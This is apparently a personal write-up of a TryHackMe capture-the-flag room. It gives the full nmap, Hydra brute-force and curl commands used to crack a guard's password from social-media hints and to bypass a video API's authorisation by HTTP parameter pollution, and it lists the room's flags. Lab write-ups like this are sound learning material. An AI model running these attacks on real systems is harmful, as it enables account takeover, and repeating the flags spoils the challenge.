---
title: The Great Disappearing Act
date: 2025-12-03
draft: false
tags:
  - TryHackMe
  - Cybersecurity
  - AOC
---
## Task  1 - Introduction 

No answer needed

---
## Task  2 - Escape!

*I ran a basic nmap scan, this is what I got:*

```bash
PORT     STATE    SERVICE
22/tcp   open     ssh
80/tcp   open     http
8000/tcp open     http-alt
8080/tcp open     http-proxy
9001/tcp filtered tor-orport
```

*Port `80` leads to a security console, port `8000` leads to` Fakebook` social media website and port `8080` redirects to the same console on port `80`*

#### Possible Hints:

 Security Console Website: 
 
 - `Hopkins, please stop forgetting your password`
 
 Fakebook Website Comments

- Guard Hopkins: `Happy 43rd anniversary to the year I was born. Yep 1982! What a year for the world. `

- Sir Carrotbane: `HAHAHA heard they locked up my old boss Hopper. GOOD! ITS WHERE HE BELONGS , The red team battalion has been WAY better since I took control. `

- Sir Carrotbane: `Did you know that if you enter your password as a comment on a post, it appears as *'s? `

- Sir Carrotbae: `Trying my hand at some bruteforcing challenges on thm, good to see they have /opt/hashcat-utils/src/combinator.bin on the AttackBox! Always comes in handy `

- Guard Hopkins: `Taking Johnnyboy on a walk! Johnnyboy is my best friend although I do have more (sorry for the brag) `

- Guard Hopkins: `@DoorDasher , My discount code didn't work on my latest order, just realised I paid full price. Can you check your support email , you should have one from: guard.hopkins@hopsecasylum.com `

Comments on Post:

- Guard Hopkis: `Pizza1234$`

- Guard Hopkis: `WHAT THE HELL CARROTBANE!!! NOW I NEED TO CHANGE MY PASSWORD!!!!!`

*The comment about `combinator.bin` heavily suggests that we have to combine wordlists to bruteforce the password. We already Hopkin's email - `guard.hopkins@hopsecasylum.com`*

*I ended up creating 2 wordlists - 1 containing various strings and another containing numbers and symbols. Ofcourse I used AI to help me create these 2 wordlists*

*Here's a small snippet of what those wordlists looked like:*

```
Pizza
pizza
PIZZA
Hopkins
hopkins
HOPKINS
Hopkis
guard.hopkins
guardhopkins
GuardHopkins
Johnnyboy
johnnyboy
Johnny...and more
```

```
1234
12345
123456
1982
43
82
22
2025
1982$
1982!
1982@
1982#
1982%
43$
43!
43@...and more
```

*I combined them with the following command:*

```bash
combinator.bin l1.txt l1.txt > l12.txt
```

*I then ran `Hydra` to brute force. By the way, you have to use `8080` proxy and not `80` as it does not work:*

```
hydra -s 8080 -t 16 -V -f   -l "guard.hopkins@hopsecasylum.com" -P t12.txt 10.49.163.2   http-post-form "/cgi-bin/login.sh:username=^USER^&password=^PASS^:Invalid username or password"
```

```bash
[ATTEMPT] target 10.49.163.2 - login "guard.hopkins@hopsecasylum.com" - pass "Johnnyboy!1234" - 751 of 2091 [child 14] (0/0)
[ATTEMPT] target 10.49.163.2 - login "guard.hopkins@hopsecasylum.com" - pass "Johnnyboy@1234" - 752 of 2091 [child 5] (0/0)
[8080][http-post-form] host: 10.49.163.2   login: guard.hopkins@hopsecasylum.com   password: Johnnyboy1982!
[STATUS] attack finished for 10.49.163.2 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-12-03 18:23:09
```

*The password is: `Johnnyboy1982!`*

*I proceeded to unlock the `Cell / Storage` Wing as instructed in the task and got the first flag .
`THM{h0pp1ing_m4d}`*

*I was running out of options so I did an extensive `nmap` scan:*

```bash
nmap -sC -sV -p- 10.49.163.2
```

*The most interesting port out of these was `13400` as it led to `HopSec Asylum Facility Video Portal`.*

*This took me forever to figure out so I'll summarize what I did:*

*I logged into the video portal with the guard credentials and extracted the JWT token from localStorage.

*I discovered the server wasn't validating the JWT signature, so I modified the token to change `"role":"guard"` to `"role":"admin"` and updated it in localStorage.*

*However, when I tried requesting the admin camera (cam-admin) using the modified token with

```bash
curl -X POST "http://10.48.191.182:13401/v1/streams/request" -H "Authorization: Bearer {\"sub\": \"guard.hopkins@hopsecasylum.com\", \"role\": \"admin\", \"iat\": 1765182837}.<signature>" -d '{"camera_id":"cam-admin","tier":"admin"}'
```

*the server returned a 401 unauthorized error. This meant the signature was actually being validated when the role changed.*

*I went back to using the original valid guard token and tried several exploitation techniques on the `/v1/streams/request` endpoint itself testing missing tier fields, requesting guard cameras with admin tiers etc.

*The breakthrough came when I tested HTTP Parameter Pollution by passing `tier=admin` as a URL query parameter while keeping `tier=guard` in the JSON body:*

```bash
curl -X POST "http://10.48.191.182:13401/v1/streams/request?tier=admin" -H "Authorization: Bearer {valid_guard_token}" -d '{"camera_id":"cam-admin","tier":"guard"}'
```

*This returned `"effective_tier": "admin"`  with a valid admin ticket, exploiting the server's priority of query parameters over body parameters. I then accessed the real admin camera stream using the ticket ID in the manifest URL.*

*The video showed a keypad being accessed - The code `115879`*

*But of course, it cant't be this easy (even though it wasn't). I only found the first part of the flag:*

`THM{Y0u_h4ve_b3en_`

#### 1) What is the first flag?

**Ans:** `THM{h0pp1ing_m4d}`

#### 2) What is the second flag?

**Ans:** `THM{Y0u_h4ve_b3en_`

This is as far as I got...

---

